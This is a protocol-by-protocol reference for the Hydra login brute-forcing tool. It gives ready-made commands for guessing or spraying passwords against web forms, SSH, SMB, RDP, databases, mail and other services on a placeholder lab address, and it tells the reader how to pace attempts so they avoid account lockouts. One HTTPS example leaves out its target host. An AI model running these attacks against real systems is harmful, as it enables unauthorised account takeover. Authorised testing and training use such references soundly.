# Hydra — Protocol Module Reference

## HTTP / HTTPS Forms

### Identifying Failure String

```bash
# Capture a failed login response to find the failure string
curl -s -X POST http://target/login -d 'user=test&pass=wrong' | grep -i 'invalid\|error\|failed'
```

### http-post-form Syntax

```
"<path>:<POST-data>:<failure-string>"
```

- `^USER^` — substituted with each username
- `^PASS^` — substituted with each password
- Failure string: substring in the response body on failed auth

```bash
# Standard POST form
hydra -l admin -P pass.txt 10.10.10.10 http-post-form \
  "/login.php:username=^USER^&password=^PASS^:Invalid credentials"

# HTTPS (prefix with https-)
hydra -l admin -P pass.txt 10.10.10.10 https-post-form \
  "/login:user=^USER^&pass=^PASS^:Wrong"

# With cookie (session required before login page)
hydra -l admin -P pass.txt 10.10.10.10 http-post-form \
  "/login:user=^USER^&pass=^PASS^:H=Cookie: PHPSESSID=abc123:Invalid"
```

### http-get (Basic Auth)

```bash
hydra -l admin -P pass.txt http-get://10.10.10.10/protected
```

## SSH

```bash
hydra -l root -P pass.txt ssh://10.10.10.10 -t 4
# -t 4: SSH drops connections with MaxStartups > 10; keep low
```

## FTP

```bash
hydra -l ftp -P pass.txt ftp://10.10.10.10
```

## SMB

```bash
# Password spray — single password, many users
hydra -L users.txt -p 'Password123!' smb://10.10.10.10

# Full brute-force (slow, avoid lockout)
hydra -l administrator -P pass.txt smb://10.10.10.10 -t 1 -W 5
```

> SMB lockout policy is common. Use `-t 1 -W <interval>` matching lockout reset window.

## RDP

```bash
hydra -l administrator -P pass.txt rdp://10.10.10.10 -t 4 -W 3
```

## WinRM

```bash
hydra -l administrator -P pass.txt winrm://10.10.10.10 -t 2
```

## MSSQL / MySQL / PostgreSQL

```bash
hydra -l sa -P pass.txt mssql://10.10.10.10
hydra -l root -P pass.txt mysql://10.10.10.10
hydra -l postgres -P pass.txt postgres://10.10.10.10
```

## VNC

```bash
# VNC uses password only (no username)
hydra -P pass.txt vnc://10.10.10.10 -t 1
```

## LDAP

```bash
hydra -l "CN=admin,DC=corp,DC=local" -P pass.txt ldap2://10.10.10.10
```

## SMTP / IMAP / POP3

```bash
hydra -l user@corp.com -P pass.txt smtp://10.10.10.10
hydra -l user -P pass.txt imap://10.10.10.10
hydra -l user -P pass.txt pop3://10.10.10.10
```

## Redis

```bash
# Redis has no username; use any for -l
hydra -l x -P pass.txt redis://10.10.10.10
```

## HTTPS with Self-Signed Cert

```bash
# Add -s 443 if non-standard port
hydra -l admin -P pass.txt -s 443 https-post-form \
  "/login:user=^USER^&pass=^PASS^:Invalid"
```

## Multiple Targets

```bash
# Target list file
hydra -l admin -P pass.txt -M targets.txt ssh -T 10
```

## Output and Resume

```bash
# Save results
hydra -l admin -P pass.txt ssh://10.10.10.10 -o results.txt

# Restore interrupted session
hydra -R
```
